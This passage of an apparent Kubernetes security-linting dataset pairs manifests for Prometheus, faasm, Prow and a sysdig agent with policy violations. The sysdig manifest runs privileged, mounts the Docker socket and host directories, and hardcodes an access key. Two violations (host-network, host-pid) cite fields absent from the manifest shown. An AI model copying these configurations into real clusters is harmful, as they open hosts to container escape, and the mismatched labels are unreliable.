    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: prometheus\n      phase: prod\n  template:\n    metadata:\n      labels:\n        name: prometheus\n        phase: prod\n    spec:\n      securityContext:\n        seccompProfile:\n          type: RuntimeDefault\n      serviceAccountName: prometheus\n      containers:\n      - name: prometheus\n        image: quay.io/prometheus/prometheus:v2.28.0\n        args:\n        - --web.listen-address=0.0.0.0:9090\n        - --config.file=/etc/prometheus/prometheus.yaml\n        - --storage.tsdb.path=/var/lib/prometheus\n        ports:\n        - name: web\n          containerPort: 9090\n        resources:\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: config\n          mountPath: /etc/prometheus\n        - name: rules\n          mountPath: /etc/prometheus/rules\n        - name: data\n          mountPath: /var/lib/prometheus\n        livenessProbe:\n          httpGet:\n            path: /-/healthy\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /-/ready\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n      volumes:\n      - name: config\n        configMap:\n          name: prometheus-config\n      - name: rules\n        configMap:\n          name: prometheus-rules\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus\" is not set to runAsNonRoot"
  },
  {
    "id": "6882",
    "manifest_path": "data/manifests/the_stack_sample/sample_2508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: prometheus\n      phase: prod\n  template:\n    metadata:\n      labels:\n        name: prometheus\n        phase: prod\n    spec:\n      securityContext:\n        seccompProfile:\n          type: RuntimeDefault\n      serviceAccountName: prometheus\n      containers:\n      - name: prometheus\n        image: quay.io/prometheus/prometheus:v2.28.0\n        args:\n        - --web.listen-address=0.0.0.0:9090\n        - --config.file=/etc/prometheus/prometheus.yaml\n        - --storage.tsdb.path=/var/lib/prometheus\n        ports:\n        - name: web\n          containerPort: 9090\n        resources:\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: config\n          mountPath: /etc/prometheus\n        - name: rules\n          mountPath: /etc/prometheus/rules\n        - name: data\n          mountPath: /var/lib/prometheus\n        livenessProbe:\n          httpGet:\n            path: /-/healthy\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /-/ready\n            port: 9090\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n      volumes:\n      - name: config\n        configMap:\n          name: prometheus-config\n      - name: rules\n        configMap:\n          name: prometheus-rules\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus\" has memory limit 0"
  },
  {
    "id": "6883",
    "manifest_path": "data/manifests/the_stack_sample/sample_2509.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: upload\n  namespace: faasm\n  labels:\n    app: faasm\n    role: upload\nspec:\n  containers:\n  - name: upload\n    image: faasm/upload:0.5.16\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 8002\n    env:\n    - name: REDIS_STATE_HOST\n      value: redis-state\n    - name: REDIS_QUEUE_HOST\n      value: redis-queue\n    - name: FUNCTION_STORAGE\n      value: local\n    - name: LOG_LEVEL\n      value: debug\n    - name: CGROUP_MODE\n      value: 'off'\n    - name: NETNS_MODE\n      value: 'off'\n    - name: STATE_MODE\n      value: redis\n    - name: LD_LIBRARY_PATH\n      value: /build/faasm/third-party/lib:/usr/local/lib\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"upload\" does not have a read-only root file system"
  },
  {
    "id": "6884",
    "manifest_path": "data/manifests/the_stack_sample/sample_2509.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: upload\n  namespace: faasm\n  labels:\n    app: faasm\n    role: upload\nspec:\n  containers:\n  - name: upload\n    image: faasm/upload:0.5.16\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 8002\n    env:\n    - name: REDIS_STATE_HOST\n      value: redis-state\n    - name: REDIS_QUEUE_HOST\n      value: redis-queue\n    - name: FUNCTION_STORAGE\n      value: local\n    - name: LOG_LEVEL\n      value: debug\n    - name: CGROUP_MODE\n      value: 'off'\n    - name: NETNS_MODE\n      value: 'off'\n    - name: STATE_MODE\n      value: redis\n    - name: LD_LIBRARY_PATH\n      value: /build/faasm/third-party/lib:/usr/local/lib\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"upload\" is not set to runAsNonRoot"
  },
  {
    "id": "6885",
    "manifest_path": "data/manifests/the_stack_sample/sample_2509.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: upload\n  namespace: faasm\n  labels:\n    app: faasm\n    role: upload\nspec:\n  containers:\n  - name: upload\n    image: faasm/upload:0.5.16\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 8002\n    env:\n    - name: REDIS_STATE_HOST\n      value: redis-state\n    - name: REDIS_QUEUE_HOST\n      value: redis-queue\n    - name: FUNCTION_STORAGE\n      value: local\n    - name: LOG_LEVEL\n      value: debug\n    - name: CGROUP_MODE\n      value: 'off'\n    - name: NETNS_MODE\n      value: 'off'\n    - name: STATE_MODE\n      value: redis\n    - name: LD_LIBRARY_PATH\n      value: /build/faasm/third-party/lib:/usr/local/lib\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"upload\" has cpu request 0"
  },
  {
    "id": "6886",
    "manifest_path": "data/manifests/the_stack_sample/sample_2509.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: upload\n  namespace: faasm\n  labels:\n    app: faasm\n    role: upload\nspec:\n  containers:\n  - name: upload\n    image: faasm/upload:0.5.16\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 8002\n    env:\n    - name: REDIS_STATE_HOST\n      value: redis-state\n    - name: REDIS_QUEUE_HOST\n      value: redis-queue\n    - name: FUNCTION_STORAGE\n      value: local\n    - name: LOG_LEVEL\n      value: debug\n    - name: CGROUP_MODE\n      value: 'off'\n    - name: NETNS_MODE\n      value: 'off'\n    - name: STATE_MODE\n      value: redis\n    - name: LD_LIBRARY_PATH\n      value: /build/faasm/third-party/lib:/usr/local/lib\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"upload\" has memory limit 0"
  },
  {
    "id": "6887",
    "manifest_path": "data/manifests/the_stack_sample/sample_2511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210806-c95403cd67\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "6888",
    "manifest_path": "data/manifests/the_stack_sample/sample_2511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210806-c95403cd67\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"statusreconciler\" not found"
  },
  {
    "id": "6889",
    "manifest_path": "data/manifests/the_stack_sample/sample_2511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210806-c95403cd67\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "6890",
    "manifest_path": "data/manifests/the_stack_sample/sample_2511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210806-c95403cd67\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "6891",
    "manifest_path": "data/manifests/the_stack_sample/sample_2511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210806-c95403cd67\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "6892",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "docker-sock",
    "violation_text": "host system directory \"/var/run/docker.sock\" is mounted on container \"sysdig-agent\""
  },
  {
    "id": "6893",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "6894",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "6895",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sysdig-agent\" is using an invalid container image, \"sysdig/agent\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6896",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 100 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6897",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sysdig-agent\" does not have a read-only root file system"
  },
  {
    "id": "6898",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"sysdig-agent\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "6899",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"sysdig-agent\" is privileged"
  },
  {
    "id": "6900",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sysdig-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "6901",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/boot\" is mounted on container \"sysdig-agent\""
  },
  {
    "id": "6902",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"sysdig-agent\""
  },
  {
    "id": "6903",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
